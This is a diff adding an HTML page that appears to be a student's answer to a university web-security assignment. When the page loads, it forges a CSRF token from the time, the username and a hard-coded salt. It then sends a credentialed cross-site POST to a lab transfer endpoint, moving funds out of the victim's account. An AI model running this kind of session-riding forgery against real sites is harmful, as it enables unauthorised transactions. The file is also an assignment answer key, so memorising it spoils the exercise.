@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Assignment 4 Q3</title>
+    <script src="https://insecurityclass.cs.uchicago.edu/3/sjcl.js"></script>
+    <script src="https://insecurityclass.cs.uchicago.edu/3/sha512.js"></script>
+    <script src="https://insecurityclass.cs.uchicago.edu/3/codecHex.js"></script>
+    <script src="https://insecurityclass.cs.uchicago.edu/3/codecString.js"></script>
+    <script src="https://insecurityclass.cs.uchicago.edu/3/bitArray.js"></script>
+    <script>
+        function computecsrf() {
+            var sendername = 'blase';
+            var csrftoken = sjcl.codec.hex.fromBits(sjcl.hash.sha512.hash(String(Math.floor(Date.now() / 10000)) + sendername + "dorsteniagigas"));
+            return csrftoken;
+        }
+        var xhttp = new XMLHttpRequest();
+        xhttp.responseType = 'text';
+        xhttp.onload = function () {
+            if (xhttp.readyState === xhttp.DONE) {
+                if (xhttp.status === 200) {
+                    console.log(xhttp.response);
+                    console.log(xhttp.responseText);
+                }
+            }
+        };
+        xhttp.open("POST", "https://insecurityclass.cs.uchicago.edu/3/transfer.php", true);
+        xhttp.withCredentials = true;
+        xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        var csrftoken = computecsrf();
+        xhttp.send('amount=999&recipient=ruolinzheng&sender=blase&csrftoken=' + csrftoken);
+    </script>
+</head>
+<body>
+    <div>Hello</div>
+</body>
+</html>
